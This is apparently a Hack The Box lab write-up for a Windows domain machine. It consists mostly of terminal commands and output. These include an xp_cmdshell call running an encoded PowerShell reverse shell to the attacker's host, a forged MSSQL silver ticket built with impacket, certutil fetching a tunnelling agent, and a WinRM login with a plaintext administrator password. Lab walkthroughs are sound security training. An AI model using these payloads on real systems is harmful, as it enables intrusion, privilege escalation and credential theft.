SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAyADgAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

```

```
┌─[✗]─[tester@parrot]─[~/Desktop]
└──╼ $sudo rlwrap -cAr nc -lnvp 443
[sudo] password for tester: 
Listening on 0.0.0.0 443
Connection received on 10.129.242.173 57970
whoami 
signed\mssqlsvc
PS C:\Windows\system32> 

```

### admin

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State   
============================= ================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
SeCreateGlobalPrivilege       Create global objects              Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-Mssql" >}} There’s an interesting quirk of MSSQL and its [OPENROWSET](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql?view=sql-server-ver17) where it will use the groups given to it in the authenticating service ticket *if* the ticket is for the account running MSSQL (so in this case mssqlsvc). I can’t find documentation for this behavior, though I confirmed it only works when the user ID of the mssqlsvc user is explicitly given (the actual username given doesn’t matter). [sokafr](https://bsky.app/profile/sokafr.bsky.social) on BlueSky tipped me off to a post from xct, [MSSQL Silver Tickets and Token Privileges](https://vuln.dev/silver-ticket-mssql-clr/), that shows how this works. I also showed this attack before in [Escape](https://0xdf.gitlab.io/2023/06/17/htb-escape.html#beyond-root---silver-ticket).

{{< /toggle >}}

```
┌─[✗]─[tester@parrot]─[~/Desktop]
└──╼ $/usr/share/doc/python3-impacket/examples/ticketer.py  -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for signed.htb/doesntmatter
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in doesntmatter.ccache

```

I’m still dbo, and showing as the mssqlsvc account. If I try `xp_cmdshell` to read the root flag, it fails:

```
┌─[tester@parrot]─[~/Desktop]
└──╼ $KRB5CCNAME=doesntmatter.ccache /usr/share/doc/python3-impacket/examples/mssqlclient.py -no-pass -k DC01.signed.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> 

```

mssqlsvc is spawning a new `cmd.exe` process, and it doesn’t get the groups from the ticket. I can show this explicitly:

```
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami /groups"
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

GROUP INFORMATION                                                                  

-----------------                                                                  

NULL                                                                               

Group Name                                 Type             SID                                                             Attributes                                           

========================================== ================ =============================================================== ==================================================   

Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group   

BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group   

BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group   

NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group   

CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group   

NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group   

NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group   

NT SERVICE\MSSQLSERVER                     Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner       

LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group   

Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group   

Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                         

NULL                                                                               

SQL (SIGNED\mssqlsvc  dbo@master)> 

```

But `OPENROWSET` with the `BULK` keyword can read files using those groups:

```
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
BulkColumn                                
---------------------------------------   
b'1957da061fc56cf2f23c6e92e3813e54\r\n'   

```

```
┌─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz && tar -xzvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz  && rm -rf README.md LICENSE  ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
LICENSE
README.md
proxy

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-ligolo-Proxy-linux-x86-to-Windows-X86" >}} Setting up the ligolo-ng

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $chmod +x ./proxy && sudo ./proxy -laddr 0.0.0.0:11601 -selfcert -v
[sudo] password for tester: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? Yes
? Allow CORS Access from https://webui.ligolo.ng? Yes
WARN[0006] WebUI enabled, default username and login are ligolo:password - make sure to update ligolo-ng.yaml to change credentials! 
WARN[0006]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/main.go:113 main.main() Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0006]/home/runner/work/ligolo-ng/ligolo-ng/pkg/tlsutils/selfcert.go:86 github.com/nicocha30/ligolo-ng/pkg/tlsutils.(*SelfCert).GetCertificate() Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0006]/home/runner/work/ligolo-ng/ligolo-ng/pkg/controller/controller.go:105 github.com/nicocha30/ligolo-ng/pkg/controller.(*Controller).ListenAndServe() Listening on 0.0.0.0:11601                   
INFO[0006]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/main.go:182 main.main() Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0006]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/daemon.go:89 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartLigoloApi() Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng »  
```

```
┌─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip && unzip -q ligolo-ng_agent_0.8.2_windows_amd64.zip && rm -rf ligolo-ng_agent_0.8.2_windows_amd64.zip README.md LICENSE && sudo python3 -m http.server 8082
[sudo] password for tester: 
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...

```

```
PS C:\Windows\system32> certutil -urlcache -split -f http://10.10.16.128:8082/agent.exe C:\ProgramData\agent.exe
****  Online  ****
  000000  ...
  662600
CertUtil: -URLCache command completed successfully.

```

```
PS C:\Windows\system32> cd C:\ProgramData\
PS C:\ProgramData> dir


    Directory: C:\ProgramData


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d---s-        4/10/2020  10:46 AM                Microsoft                                                             
d-----        10/6/2025   8:26 AM                Package Cache                                                         
d-----         9/7/2022   3:50 AM                regid.1991-06.com.microsoft                                           
d-----        9/15/2018  12:19 AM                SoftwareDistribution                                                  
d-----        4/10/2020   5:48 AM                ssh                                                                   
d-----        4/10/2020  10:49 AM                USOPrivate                                                            
d-----        4/10/2020  10:49 AM                USOShared                                                             
d-----        8/25/2021   2:57 AM                VMware                                                                
-a----         6/3/2026  10:34 PM        6694400 agent.exe        
```

```
PS C:\ProgramData> .\agent.exe -connect 10.10.16.128:11601 -ignore-cert
```

```
INFO[0594]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/interfaces.go:345 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Creating routes for evolvinglayla...         
? Start the tunnel? Yes
INFO[0596]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/app.go:148 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel() Starting tunnel to SIGNED\mssqlsvc@DC01 (a2dead02a9a3) 
error: unable to start tunnel: unable to open tun interface 'evolvinglayla' (tun.New device or resource busy)
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $sudo ip route del 10.129.0.0/16
```

```
[Agent : SIGNED\mssqlsvc@DC01] » autoroute
? Select routes to add: 10.129.242.173/16
? Create a new interface or use an existing one? Create a new interface
INFO[0756]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/interfaces.go:317 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Generating a random interface name...        
INFO[0756]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/interfaces.go:325 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Using interface name rapidexodus             
INFO[0756]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/interfaces.go:345 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Creating routes for rapidexodus...           
? Start the tunnel? Yes
DEBU[0758]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/app.go:141 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel() Creating tun interface rapidexodus           
INFO[0758]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/app.go:148 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel() Starting tunnel to SIGNED\mssqlsvc@DC01 (a2dead02a9a3) 
DEBU[0758]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/app.go:160 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel() Creating route rapidexodus on interface 10.129.242.173/16 
[Agent : SIGNED\mssqlsvc@DC01] » WARN[0759]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/app.go:194 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel.func1() Lost tunnel connection with agent SIGNED\mssqlsvc@DC01 (a2dead02a9a3)! 
WARN[0759]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/main.go:168 main.main.func3.1() Agent dropped.                                id=a2dead02a9a3 name="SIGNED\\mssqlsvc@DC01" remote="10.129.242.173:56345"

```

but it cant run as the 127.0.0.1

```
┌─[✗]─[tester@parrot]─[~/Desktop]
└──╼ $proxychains evil-winrm-py -i 127.0.0.1 -u administrator -p 'Th1s889Rabb!t' --ssl
```

```
evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
1957da061fc56cf2f23c6e92e3813e54
evil-winrm-py PS C:\Users\Administrator\Desktop>

```
